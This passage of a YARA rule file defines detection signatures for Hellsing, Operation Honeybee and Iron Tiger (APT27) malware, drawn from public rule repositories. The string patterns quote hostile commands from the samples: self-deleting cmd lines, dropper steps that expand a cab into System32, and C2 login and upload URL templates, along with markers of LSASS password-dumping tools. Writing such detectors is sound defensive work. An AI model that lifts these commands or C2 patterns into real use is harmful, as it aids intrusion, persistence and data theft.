/(L)ocking doors/ wide ascii\n        $engine4 = /(R)otors engaged/ wide ascii\n        $engine5 = /(I)\\'m going to start it/ wide ascii\n        $start1 = /Starting upgrade\\!/ wide ascii\n        $start2 = /(I)\\'m going to start the program/ wide ascii\n        $start3 = /(i)s it ok\\?/ wide ascii\n        $start4 = /(C)lick to start the program/ wide ascii\n        $upd1 = /(U)pdJob/ wide ascii\n        $upd2 = /(U)pdTimer/ wide ascii\n        $lookma1 = /(O)wning PCI bus/ wide\n        $lookma2 = /(F)ormatting bios/ wide\n        $lookma3 = /(P)lease insert a disk in drive A:/ wide\n        $lookma4 = /(U)pdating CPU microcode/ wide\n        $lookma5 = /(N)ot sure what's happening/ wide\n        $lookma6 = /(L)ook ma, no thread id\\! \\\\\\\\o\\// wide\n\n    condition:\n        (all of ($engine*) or all of ($start*) or all of ($upd*) or 4 of ($lookma*)) and not any of ($filter*)\n}\n\nrule Hellsing_implantstrings\n{\n    meta:\n        description = \"Hellsing implant\"\n        threat_names = \"Hellsing\"\n        ref = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Costin Raiu, Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_hellsing_implantstrings\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"the file uploaded failed !\"\n        $a2 = \"ping 127.0.0.1\"\n        $b1 = \"the file downloaded failed !\"\n        $b2 = \"common.asp\"\n        $c = \"xweber_server.exe\"\n        $d = \"action=\"\n        $debugpath1 = \"d:\\\\Hellsing\\\\release\\\\msger\\\\\" nocase\n        $debugpath2 = \"d:\\\\hellsing\\\\sys\\\\xrat\\\\\" nocase\n        $debugpath3 = \"D:\\\\Hellsing\\\\release\\\\exe\\\\\" nocase\n        $debugpath4 = \"d:\\\\hellsing\\\\sys\\\\xkat\\\\\" nocase\n        $debugpath5 = \"e:\\\\Hellsing\\\\release\\\\clare\" nocase\n        $debugpath6 = \"e:\\\\Hellsing\\\\release\\\\irene\\\\\" nocase\n        $debugpath7 = \"d:\\\\hellsing\\\\sys\\\\irene\\\\\" nocase\n        $e = \"msger_server.dll\"\n        $f = \"ServiceMain\"\n\n    condition:\n        uint16(0) == 0x5a4d and (all of ($a*)) or (all of ($b*)) or ($c and $d) or (any of ($debugpath*)) or ($e and $f) and filesize < 500000\n}\n\nrule Hellsing_installer\n{\n    meta:\n        description = \"Hellsing xweber/msger installer\"\n        threat_names = \"Hellsing\"\n        ref = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Costin Raiu, Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_hellsing_installer\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $cmd = \"cmd.exe /c ping 127.0.0.1 -n 5&cmd.exe /c del /a /f \\\"%s\\\"\"\n        $a1 = \"xweber_install_uac.exe\"\n        $a2 = \"system32\\\\cmd.exe\" wide\n        $a4 = \"S11SWFOrVwR9UlpWRVZZWAR0U1aoBHFTUl2oU1Y=\"\n        $a5 = \"S11SWFOrVwR9dnFTUgRUVlNHWVdXBFpTVgRdUlpWRVZZWARdUqhZVlpFR1kEUVNSXahTVgRaU1YEUVNSXahTVl1SWwRZValdVFFZUqgQBF1SWlZFVllYBFRTVqg=\"\n        $a6 = \"7dqm2ODf5N/Y2N/m6+br3dnZpunl44g=\"\n        $a7 = \"vd/m7OXd2ai/5u7a59rr7Ki45drcqMPl5t/c5dqIZw==\"\n        $a8 = \"vd/m7OXd2ai/usPl5qjY2uXp69nZqO7l2qjf5u7a59rr7Kjf5tzr2u7n6euo4+Xm39zl2qju5dqo4+Xm39zl2t/m7ajr19vf2OPr39rj5eaZmqbs5OSI Njl2tyI\"\n        $a9 = \"C:\\\\Windows\\\\System32\\\\sysprep\\\\sysprep.exe\" wide\n        $a10 = \"%SystemRoot%\\\\system32\\\\cmd.exe\" wide\n        $a11 = \"msger_install.dll\"\n        $a12 = {00 65 78 2E 64 6C 6C 00}\n\n    condition:\n        uint16(0) == 0x5a4d and ($cmd and (2 of ($a*))) and filesize < 500000\n}\n\nrule Hellsing_proxytool\n{\n    meta:\n        description = \"Hellsing proxy testing tool\"\n        threat_names = \"Hellsing\"\n        ref = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Costin Raiu, Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_hellsing_proxytool\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"PROXY_INFO: automatic proxy url => %s \"\n        $a2 = \"PROXY_INFO: connection type => %d \"\n        $a3 = \"PROXY_INFO: proxy server => %s \"\n        $a4 = \"PROXY_INFO: bypass list => %s \"\n        $a5 = \"InternetQueryOption failed with GetLastError() %d\"\n        $a6 = \"D:\\\\Hellsing\\\\release\\\\exe\\\\exe\\\\\" nocase\n\n    condition:\n        uint16(0) == 0x5a4d and (2 of ($a*)) and filesize < 300000\n}\n\nrule Hellsing_xkat\n{\n    meta:\n        description = \"Hellsing xKat tool\"\n        threat_names = \"Hellsing\"\n        ref = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Costin Raiu, Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_hellsing_xkat\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"\\\\Dbgv.sys\"\n        $a2 = \"XKAT_BIN\"\n        $a3 = \"release sys file error.\"\n        $a4 = \"driver_load error. \"\n        $a5 = \"driver_create error.\"\n        $a6 = \"delete file:%s error.\"\n        $a7 = \"delete file:%s ok.\"\n        $a8 = \"kill pid:%d error.\"\n        $a9 = \"kill pid:%d ok.\"\n        $a10 = \"-pid-delete\"\n        $a11 = \"kill and delete pid:%d error.\"\n        $a12 = \"kill and delete pid:%d ok.\"\n\n    condition:\n        uint16(0) == 0x5a4d and (6 of ($a*)) and filesize < 300000\n}\n\nrule Hellsing_msgertype2\n{\n    meta:\n        description = \"Hellsing msger type 2 implant\"\n        threat_names = \"Hellsing\"\n        ref = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Costin Raiu, Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_hellsing_msgertype2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"%s\\\\system\\\\%d.txt\"\n        $a2 = \"_msger\"\n        $a3 = \"http://%s/lib/common.asp?action=user_login&uid=%s&lan=%s&host=%s&os=%s&proxy=%s\"\n        $a4 = \"http://%s/data/%s.1000001000\"\n        $a5 = \"/lib/common.asp?action=user_upload&file=\"\n        $a6 = \"%02X-%02X-%02X-%02X-%02X-%02X\"\n\n    condition:\n        uint16(0) == 0x5a4d and (4 of ($a*)) and filesize < 500000\n}\n\nrule Hellsing_irene\n{\n    meta:\n        description = \"Hellsing msger irene installer\"\n        threat_names = \"Hellsing\"\n        ref = \"http://securelist.com/analysis/publications/69567/the-chronicles-of-the-hellsing-apt-the-empire-strikes-back\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Costin Raiu, Kaspersky Lab\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"apt_hellsing_irene\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a1 = \"\\\\Drivers\\\\usbmgr.tmp\" wide\n        $a2 = \"\\\\Drivers\\\\usbmgr.sys\" wide\n        $a3 = \"common_loadDriver CreateFile error! \"\n        $a4 = \"common_loadDriver StartService error && GetLastError():%d! \"\n        $a5 = \"irene\" wide\n        $a6 = \"aPLib v0.43 - the smaller the better\"\n\n    condition:\n        uint16(0) == 0x5a4d and (4 of ($a*)) and filesize < 500000\n}\n\nrule HoneyBee_Dropper_MalDoc\n{\n    meta:\n        description = \"Sample from Operation Honeybee\"\n        threat_names = \"Honeybee\"\n        ref = \"https://goo.gl/JAHZVL\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"HoneyBee_Dropper_MalDoc\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"cmd /c expand %TEMP%\\\\setup.cab -F:* %SystemRoot%\\\\System32\"\n        $x2 = \"del /f /q %TEMP%\\\\setup.cab && cliconfg.exe\"\n        $s1 = \"SELECT * FROM Win32_Processor\" fullword ascii\n        $s2 = \"\\\"cmd /c `wusa \" fullword ascii\n        $s3 = \"sTempPathP\" fullword ascii\n        $s4 = \"sTempFile\" fullword ascii\n        $s5 = \"GetObjectz\" fullword ascii\n        $s6 = \"\\\\setup.cab\" fullword ascii\n\n    condition:\n        uint16(0) == 0xcfd0 and filesize < 400KB and (1 of ($x*) or 4 of them)\n}\n\nrule HoneyBee_Malware_1\n{\n    meta:\n        description = \"Malware from Operation Honeybee\"\n        threat_names = \"Honeybee\"\n        ref = \"https://goo.gl/JAHZVL\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpHoneybee_Malware_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"cmd /c taskkill /im cliconfg.exe /f /t && del /f /q\" fullword ascii\n        $x2 = \"\\\\FTPCom_vs10\\\\Release\\\\Engine.pdb\" ascii\n        $x3 = \"KXU/yP=B29tLzidqNRuf-SbVInw0oCrmWZk6OpFc7A5GTD1QxaJ3H8h4jMeEsYglv\" fullword ascii\n        $x4 = \"D:\\\\Task\\\\MiMul\\\\\" ascii\n        $s1 = \"[DLL_PROCESS_ATTACH]\" fullword ascii\n        $s2 = \"cmd /c systeminfo >%s\" fullword ascii\n        $s3 = \"post.txt\" fullword ascii\n        $s4 = \"\\\\temp.ini\" fullword ascii\n        $s5 = \"[GetFTPAccountInfo_10001712]\" fullword ascii\n        $s6 = \"ComSysAppMutex\" fullword ascii\n        $s7 = \"From %s (%02d-%02d %02d-%02d-%02d).txt\" fullword ascii\n        $s8 = \"%s %s %c%s%c\" fullword ascii\n        $s9 = \"TO EVERYONE\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and (pe.imphash() == \"e14b59a79999cc0bc589a4cb5994692a\" or pe.imphash() == \"64400f452e2f60305c341e08f217b02c\" or 1 of ($x*) or 3 of them)\n}\n\nrule HoneyBee_MaoCheng_Dropper\n{\n    meta:\n        description = \"MaoCheng dropper from Operation Honeybee\"\n        threat_names = \"Honeybee\"\n        ref = \"https://goo.gl/JAHZVL\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"OpHoneybee_MaoCheng_Dropper\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\MaoCheng\\\\Release\\\\\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and 1 of them\n}\n\nrule IronTiger_ASPXSpy\n{\n    meta:\n        description = \"ASPXSpy detection. It might be used by other fraudsters\"\n        threat_names = \"ASPXSpy, Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_ASPXSpy\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"ASPXSpy\" nocase wide ascii\n        $str2 = \"IIS Spy\" nocase wide ascii\n        $str3 = \"protected void DGCoW(object sender,EventArgs e)\" nocase wide ascii\n\n    condition:\n        any of ($str*)\n}\n\nrule IronTiger_ChangePort_Toolkit_driversinstall\n{\n    meta:\n        description = \"Iron Tiger Malware - Changeport Toolkit driverinstall\"\n        threat_names = \"Changeport, Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_ChangePort_Toolkit_driversinstall\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"openmydoor\" nocase wide ascii\n        $str2 = \"Install service error\" nocase wide ascii\n        $str3 = \"start remove service\" nocase wide ascii\n        $str4 = \"NdisVersion\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (2 of ($str*))\n}\n\nrule IronTiger_ChangePort_Toolkit_ChangePortExe\n{\n    meta:\n        description = \"Iron Tiger Malware - Toolkit ChangePort\"\n        threat_names = \"ChangePort, Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_ChangePort_Toolkit_ChangePortExe\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"Unable to alloc the adapter!\" nocase wide ascii\n        $str2 = \"Wait for master fuck\" nocase wide ascii\n        $str3 = \"xx.exe <HOST> <PORT>\" nocase wide ascii\n        $str4 = \"chkroot2007\" nocase wide ascii\n        $str5 = \"Door is bind on %s\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (2 of ($str*))\n}\n\nrule IronTiger_dllshellexc2010\n{\n    meta:\n        description = \"dllshellexc2010 Exchange backdoor + remote shell\"\n        threat_names = \"dllshellexc2010, Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_dllshellexc2010\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"Microsoft.Exchange.Clients.Auth.dll\" nocase ascii wide\n        $str2 = \"Dllshellexc2010\" nocase wide ascii\n        $str3 = \"Users\\\\ljw\\\\Documents\" nocase wide ascii\n        $bla1 = \"please input path\" nocase wide ascii\n        $bla2 = \"auth.owa\" nocase wide ascii\n\n    condition:\n        (uint16(0) == 0x5a4d) and ((any of ($str*)) or (all of ($bla*)))\n}\n\nrule IronTiger_dnstunnel\n{\n    meta:\n        description = \"DNS tunnel tool used in Operation Iron Tiger\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_dnstunnel\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"\\\\DnsTunClient\\\\\" nocase wide ascii\n        $str2 = \"\\\\t-DNSTunnel\\\\\" nocase wide ascii\n        $str3 = \"xssok.blogspot\" nocase wide ascii\n        $str4 = \"dnstunclient\" nocase wide ascii\n        $mistake1 = \"because of error, can not analysis\" nocase wide ascii\n        $mistake2 = \"can not deal witn the error\" nocase wide ascii\n        $mistake3 = \"the other retun one RST\" nocase wide ascii\n        $mistake4 = \"Coversation produce one error\" nocase wide ascii\n        $mistake5 = \"Program try to use the have deleted the buffer\" nocase wide ascii\n\n    condition:\n        (uint16(0) == 0x5a4d) and ((any of ($str*)) or (any of ($mistake*)))\n}\n\nrule IronTiger_EFH3_encoder\n{\n    meta:\n        description = \"Iron Tiger EFH3 Encoder\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_EFH3_encoder\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"EFH3 [HEX] [SRCFILE] [DSTFILE]\" nocase wide ascii\n        $str2 = \"123.EXE 123.EFH\" nocase wide ascii\n        $str3 = \"ENCODER: b[i]: = \" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}\n\nrule IronTiger_GetPassword_x64\n{\n    meta:\n        description = \"Iron Tiger Malware - GetPassword x64\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_GetPassword_x64\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"(LUID ERROR)\" nocase wide ascii\n        $str2 = \"Users\\\\K8team\\\\Desktop\\\\GetPassword\" nocase wide ascii\n        $str3 = \"Debug x64\\\\GetPassword.pdb\" nocase wide ascii\n        $bla1 = \"Authentication Package:\" nocase wide ascii\n        $bla2 = \"Authentication Domain:\" nocase wide ascii\n        $bla3 = \"* Password:\" nocase wide ascii\n        $bla4 = \"Primary User:\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))\n}\n\nrule IronTiger_GetUserInfo\n{\n    meta:\n        description = \"Iron Tiger Malware - GetUserInfo\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_GetUserInfo\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"getuserinfo username\" nocase wide ascii\n        $str2 = \"joe@joeware.net\" nocase wide ascii\n        $str3 = \"If . specified for userid,\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}\n\nrule IronTiger_Gh0stRAT_variant\n{\n    meta:\n        description = \"s.exe variant seen in Operation Iron Tiger\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_Gh0stRAT_variant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"Game Over Good Luck By Wind\" nocase wide ascii\n        $str2 = \"ReleiceName\" nocase wide ascii\n        $str3 = \"jingtisanmenxiachuanxiao.vbs\" nocase wide ascii\n        $str4 = \"Winds Update\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}\n\nrule IronTiger_GTalk_Trojan\n{\n    meta:\n        description = \"Iron Tiger Malware - GTalk Trojan\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_GTalk_Trojan\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"gtalklite.com\" nocase wide ascii\n        $str2 = \"computer=%s&lanip=%s&uid=%s&os=%s&data=%s\" nocase wide ascii\n        $str3 = \"D13idmAdm\" nocase wide ascii\n        $str4 = \"Error: PeekNamedPipe failed with %i\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (2 of ($str*))\n}\n\nrule IronTiger_HTTP_SOCKS_Proxy_soexe\n{\n    meta:\n        description = \"Iron Tiger Toolset - HTTP SOCKS Proxy soexe\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_HTTP_SOCKS_Proxy_soexe\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"listen SOCKET error.\" nocase wide ascii\n        $str2 = \"WSAAsyncSelect SOCKET error.\" nocase wide ascii\n        $str3 = \"new SOCKETINFO error!\" nocase wide ascii\n        $str4 = \"Http/1.1 403 Forbidden\" nocase wide ascii\n        $str5 = \"Create SOCKET error.\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (3 of ($str*))\n}\n\nrule IronTiger_NBDDos_Gh0stvariant_dropper\n{\n    meta:\n        description = \"Iron Tiger Malware - NBDDos Gh0stvariant Dropper\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_NBDDos_Gh0stvariant_dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"This service can't be stoped.\" nocase wide ascii\n        $str2 = \"Provides support for media palyer\" nocase wide ascii\n        $str4 = \"CreaetProcess Error\" nocase wide ascii\n        $bla1 = \"Kill You\" nocase wide ascii\n        $bla2 = \"%4.2f GB\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and ((any of ($str*)) or (all of ($bla*)))\n}\n\nrule IronTiger_PlugX_DosEmulator\n{\n    meta:\n        description = \"Iron Tiger Malware - PlugX DosEmulator\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_PlugX_DosEmulator\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"Dos Emluator Ver\" nocase wide ascii\n        $str2 = \"\\\\PIPE\\\\FASTDOS\" nocase wide ascii\n        $str3 = \"FastDos.cpp\" nocase wide ascii\n        $str4 = \"fail,error code = %d.\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}\n\nrule IronTiger_PlugX_FastProxy\n{\n    meta:\n        description = \"Iron Tiger Malware - PlugX FastProxy\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_PlugX_FastProxy\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"SAFEPROXY HTServerTimer Quit!\" nocase wide ascii\n        $str2 = \"Useage: %s pid\" nocase wide ascii\n        $str3 = \"%s PORT[%d] TO PORT[%d] SUCCESS!\" nocase wide ascii\n        $str4 = \"p0: port for listener\" nocase wide ascii\n        $str5 = \"\\\\users\\\\whg\\\\desktop\\\\plug\\\\\" nocase wide ascii\n        $str6 = \"[+Y] cwnd : %3d, fligth:\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (any of ($str*))\n}\n\nrule IronTiger_PlugX_Server\n{\n    meta:\n        description = \"Iron Tiger Malware - PlugX Server\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_PlugX_Server\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"\\\\UnitFrmManagerKeyLog.pas\" nocase wide ascii\n        $str2 = \"\\\\UnitFrmManagerRegister.pas\" nocase wide ascii\n        $str3 = \"Input Name...\" nocase wide ascii\n        $str4 = \"New Value#\" nocase wide ascii\n        $str5 = \"TThreadRControl.Execute SEH!!!\" nocase wide ascii\n        $str6 = \"\\\\UnitFrmRControl.pas\" nocase wide ascii\n        $str7 = \"OnSocket(event is error)!\" nocase wide ascii\n        $str8 = \"Make 3F Version Ok!!!\" nocase wide ascii\n        $str9 = \"PELEASE DO NOT CHANGE THE DOCAMENT\" nocase wide ascii\n        $str10 = \"Press [Ok] Continue Run, Press [Cancel] Exit\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (2 of ($str*))\n}\n\nrule IronTiger_ReadPWD86\n{\n    meta:\n        description = \"Iron Tiger Malware - ReadPWD86\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_ReadPWD86\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"Fail To Load LSASRV\" nocase wide ascii\n        $str2 = \"Fail To Search LSASS Data\" nocase wide ascii\n        $str3 = \"User Principal\" nocase wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (all of ($str*))\n}\n\nrule IronTiger_Ring_Gh0stvariant\n{\n    meta:\n        description = \"Iron Tiger Malware - Ring Gh0stvariant\"\n        threat_names = \"Iron Tiger, APT27\"\n        ref = \"http://goo.gl/T5fSJC\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Cyber Safety Solutions, Trend Micro\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IronTiger_Ring_Gh0stvariant\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str1 = \"RING RAT Exception\" nocase wide ascii\n        $str2 = \"(can not update server recently)!\" nocase wide ascii\n        $str4 = 